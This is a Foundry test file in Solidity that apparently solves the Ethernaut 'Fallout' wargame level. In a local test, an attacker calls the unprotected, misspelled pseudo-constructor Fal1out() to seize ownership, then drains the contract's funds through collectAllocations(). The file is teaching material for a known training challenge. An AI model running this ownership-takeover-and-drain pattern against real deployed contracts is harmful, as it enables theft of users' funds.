// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../../src/fallout/Fallout.sol";

contract FalloutAttack is Test {
    address deployer;
    address attacker;
    uint256 initial_attacker_balance;
    Fallout fallout;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");
        vm.deal(deployer, 5 ether);
        vm.deal(attacker, 5 ether);
        initial_attacker_balance = attacker.balance;

        vm.startPrank(deployer);
        fallout = new Fallout();
        fallout.Fal1out{value: 1 wei}();
        vm.stopPrank();
        vm.deal(address(fallout), 100 ether);
    }
    function test_attack() public {
        vm.startPrank(attacker);
        fallout.Fal1out();

        assertEq(fallout.owner(), attacker);
        fallout.collectAllocations();
        assertGt(attacker.balance,initial_attacker_balance );
        assertEq(address(fallout).balance, 0);
    }
}
